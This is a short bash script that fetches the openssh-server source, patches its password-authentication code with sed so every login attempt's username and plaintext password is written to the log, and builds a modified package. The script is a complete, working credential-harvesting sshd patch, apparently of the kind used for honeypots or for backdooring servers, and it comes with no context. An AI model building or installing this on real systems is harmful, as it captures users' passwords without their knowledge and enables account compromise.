#!/bin/bash

apt-get source openssh-server

cd ./$(ls -d */ | grep openssh)

sed -e 's/struct passwd \*pw = authctxt->pw;/logit("Username: %s, Password: %s", authctxt->user,password);\nstruct passwd \*pw = authctxt->pw;/' -i auth-passwd.c
apt-get build-dep -y  openssh-server
dpkg-buildpackage  -uc -b

